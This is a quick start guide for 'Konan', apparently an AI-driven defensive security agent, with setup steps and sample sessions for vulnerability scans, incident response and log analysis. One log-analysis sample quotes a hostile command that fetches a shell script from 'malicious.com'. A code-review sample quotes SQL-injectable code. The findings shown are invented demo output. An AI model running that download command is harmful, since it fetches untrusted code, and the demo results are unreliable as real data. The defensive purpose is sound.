# Quick Start Guide - Konan Cybersecurity Agent

## 🚀 5-Minute Setup

### Step 1: Install and Configure

```bash
# Clone the repository
git clone https://github.com/JetSquirrel/konan.git
cd konan

# Install dependencies
uv sync

# Create configuration
cp env.example .env
```

### Step 2: Configure .env

Edit `.env` file:

```bash
# Required: LLM Configuration
BUB_MODEL=openrouter:anthropic/claude-opus-4-5
OPENROUTER_API_KEY=your_openrouter_key_here

# Optional: Security Tool APIs (for enhanced threat intelligence)
VIRUSTOTAL_API_KEY=your_virustotal_key
OTX_API_KEY=your_alienvault_otx_key

# Optional: Notifications
BUB_TELEGRAM_ENABLED=true
BUB_TELEGRAM_TOKEN=your_telegram_bot_token
BUB_TELEGRAM_ALLOW_FROM='["your_telegram_user_id"]'
```

### Step 3: Start the Agent

```bash
# Interactive CLI mode
uv run bub chat

# Or Telegram bot mode
uv run bub message
```

## 📝 Common Usage Patterns

### Pattern 1: Quick Vulnerability Scan

```
You: Can you scan the Docker image nginx:latest for vulnerabilities?

Konan: 真相只有一个！Let me scan that image for you.

[Agent activates $vulnerability-scanner skill]
[Executes: trivy image nginx:latest --severity HIGH,CRITICAL]

Found 5 HIGH and 2 CRITICAL vulnerabilities:

CRITICAL:
1. CVE-2024-1234 (CVSS 9.8) - RCE in libssl
   Package: libssl 1.1.1
   Fixed: 1.1.1w

[Full report with remediation steps...]
```

### Pattern 2: CVE Investigation

```
You: Is CVE-2024-21626 being actively exploited?

Konan: Let me check the threat intelligence...

[Agent activates $threat-intel skill]
[Queries: NVD, CISA KEV, Wiz, exploit-db]

CVE-2024-21626 - Container Escape in runc
CVSS: 8.6 (HIGH)

⚠️ Status: ACTIVELY EXPLOITED
- Found in CISA KEV catalog (added 2024-02-01)
- Exploit code publicly available
- Affects: runc < 1.1.12

Recommendations:
1. Update runc immediately to 1.1.12+
2. Scan running containers
3. Review container escape attempts in logs
```

### Pattern 3: Code Security Review

```
You: Please review ./src/auth.py for security issues

Konan: Starting security code audit...

[Agent activates $code-audit skill]
[Runs: semgrep, bandit with security rulesets]

⚠️ Found 3 security issues:

CRITICAL - SQL Injection (auth.py:45)
Pattern: String concatenation in query
Code: query = f"SELECT * FROM users WHERE id={user_id}"
Fix: Use parameterized queries

HIGH - Weak Crypto (auth.py:78)
Pattern: MD5 password hashing
Fix: Use bcrypt or argon2

[Detailed remediation for each...]
```

### Pattern 4: Incident Response

```
You: We're seeing 200+ failed SSH attempts from 192.168.1.100

Konan: 🚨 This looks like a brute force attack. Initiating incident response.

[Agent activates $incident-response skill]

INCIDENT ID: INC-2024-001
Severity: HIGH
Type: Brute Force Attack

IMMEDIATE ACTIONS TAKEN:
✅ IP 192.168.1.100 blocked via iptables
✅ Failed login analysis: targeted accounts identified
✅ Security team notified via Telegram

[Agent activates $threat-intel skill]
Checking IP reputation...
⚠️ IP flagged by VirusTotal (12/90 vendors)

INVESTIGATION:
- Attack duration: 2024-01-15 14:30-15:00 UTC
- Attempts: 234 failed logins
- Target accounts: root, admin, ubuntu
- No successful logins detected

[Full incident report with timeline...]
```

### Pattern 5: Compliance Check

```
You: Run a CIS Level 1 compliance check

Konan: Starting CIS Ubuntu Benchmark Level 1 assessment...

[Agent activates $compliance-check skill]
[Runs: OpenSCAP, Lynis, custom checks]

CIS Benchmark Results:
- Total Controls: 153
- Compliant: 112 (73%)
- Non-Compliant: 35 (23%)
- Not Applicable: 6 (4%)

HIGH PRIORITY GAPS:
1. Control 5.2.1 - Password requirements not enforced
2. Control 4.1.2 - Auditd not enabled
3. Control 3.5.1 - Firewall not configured

[Detailed remediation plan...]
```

### Pattern 6: Log Analysis

```
You: Analyze /var/log/auth.log for suspicious activity

Konan: Analyzing authentication logs...

[Agent activates $log-analysis skill]

FINDINGS:

1. Brute Force Detection:
   - IP 203.0.113.5: 45 failed attempts
   - IP 198.51.100.10: 23 failed attempts

2. Unusual Access Times:
   - User 'admin' login at 3:47 AM (unusual)
   - Normal hours: 9 AM - 6 PM

3. Suspicious Commands:
   - User 'john' executed: wget http://malicious.com/shell.sh

⚠️ RECOMMENDATION: Investigate user 'john' immediately

[Extracted IOCs and timeline...]
```

## 🎯 Advanced Usage

### Workflow 1: Full Security Assessment

```
You: Please conduct a comprehensive security assessment of this project

Konan: Understood. I'll perform a complete security evaluation.

[Agent activates multiple skills in sequence]

Phase 1: Vulnerability Scanning ($vulnerability-scanner)
- Container images: 3 scanned
- Dependencies: 247 packages checked
- Source code: 1,234 files analyzed

Phase 2: Code Security Audit ($code-audit)
- OWASP Top 10 check: complete
- Authentication review: complete
- Cryptography audit: complete

Phase 3: Compliance Verification ($compliance-check)
- CIS benchmarks: 73% compliant
- OWASP ASVS Level 2: 81% compliant

Phase 4: Log Analysis ($log-analysis)
- Auth logs: No suspicious activity
- App logs: 3 warnings found

EXECUTIVE SUMMARY:
- Risk Level: MEDIUM
- Critical Issues: 2
- High Issues: 8
- Recommended Actions: [detailed list...]

[Creates handoff anchor for tracking]
,tape.handoff name="security-assessment" summary="Complete assessment finished"
```

### Workflow 2: Incident Investigation

```
You: We detected data exfiltration. Please investigate.

Konan: 🚨 Starting incident investigation protocol.

[Agent follows structured incident response]

PHASE 1: Detection & Analysis
[Activates $log-analysis]
- Analyzed network logs
- Identified 5GB data transfer to 198.51.100.50
- Time window: 2024-01-15 02:00-03:30 UTC

PHASE 2: Threat Intelligence
[Activates $threat-intel]
- IP 198.51.100.50 reputation: ⚠️ Known malicious
- Associated with: APT group, data theft campaigns

PHASE 3: Containment
[Activates $incident-response]
✅ IP blocked
✅ Network isolated
✅ Affected systems identified

PHASE 4: Evidence Collection
- Captured network pcap
- Preserved system logs
- Created evidence package

[Creates incident report]
Full incident report: INC-2024-001.pdf
Evidence: evidence/INC-2024-001.tar.gz

[Records to tape for audit trail]
,tape.handoff name="incident-resolved" summary="Data exfiltration contained"
```

## 💡 Tips and Tricks

### Tip 1: Use Skill References
```
You: I need help with vulnerability scanning

Konan: I recommend using $vulnerability-scanner skill.
[Agent expands full skill documentation]
```

### Tip 2: Track Investigations
```
# Create investigation phase markers
,tape.handoff name="scan-started" summary="Beginning vulnerability assessment"
[... work ...]
,tape.handoff name="scan-complete" summary="Found 15 issues"

# Search past work
,tape.search query="CVE-2024"
```

### Tip 3: Get Skill Information
```
# List available skills
,skills.list

# Get detailed skill info
,skills.describe name=vulnerability-scanner
```

### Tip 4: Direct Tool Access
```
# Execute security tools directly
,bash trivy image myapp:latest
,bash semgrep --config "p/owasp-top-ten" ./src
,bash grep "Failed password" /var/log/auth.log
```

## 🔧 Integration Examples

### GitHub Actions

```yaml
# .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Security Assessment
        run: |
          uv sync
          uv run bub chat --non-interactive "Scan this project for security vulnerabilities"
```

### Pre-commit Hook

```bash
# .git/hooks/pre-commit
#!/bin/bash
uv run bub chat --non-interactive "Quick security check on staged files"
```

### Scheduled Monitoring

```bash
# Add to crontab
0 2 * * * cd /path/to/konan && uv run bub chat --non-interactive "Daily security scan" >> /var/log/security-scan.log
```

## 📚 Learning Resources

- **Skills Documentation**: Check `src/bub/skills/*/SKILL.md` for detailed guides
- **Security Agent Guide**: See `docs/security-agent.md`
- **Implementation Details**: Read `IMPLEMENTATION.md`
- **Agent Philosophy**: Review `SOUL.md` and `AGENTS.md`

## 🆘 Troubleshooting

### Issue: "Skill not found"
```bash
# Verify skills are present
ls -la src/bub/skills/

# Check skill format
,skills.list
```

### Issue: "API rate limited"
```bash
# Add API keys to .env
VIRUSTOTAL_API_KEY=your_key
OTX_API_KEY=your_key
```

### Issue: "Tool not found"
```bash
# Install security tools
pip install bandit semgrep safety
```

## 🎓 Next Steps

1. **Start with basic scans**: Try vulnerability scanning first
2. **Explore skills**: Read each SKILL.md to understand capabilities
3. **Integrate tools**: Install security tools mentioned in skills
4. **Customize**: Add your own playbooks and procedures
5. **Automate**: Set up CI/CD integration
6. **Monitor**: Configure daily security checks

---

**Remember**: 真相只有一个！ (The truth is always one!)

Happy hunting! 🔍🔒
